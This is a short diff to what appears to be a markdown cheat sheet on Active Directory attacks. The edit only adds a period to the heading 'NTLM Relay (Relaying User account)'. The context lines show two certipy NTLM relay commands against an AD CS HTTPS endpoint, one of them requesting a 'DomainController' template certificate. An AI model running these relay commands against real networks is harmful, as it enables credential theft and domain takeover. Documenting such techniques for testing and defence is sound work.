@@ -13,7 +13,7 @@ certipy relay \
     -target 'https://<IP_ADDRESS>' -template 'DomainController'
 ```
 
-## 2b NTLM Relay (Relaying User account)
+## 2b. NTLM Relay (Relaying User account)
 ```
 certipy relay -target 'https://<IP_ADDRESS>'
 ```
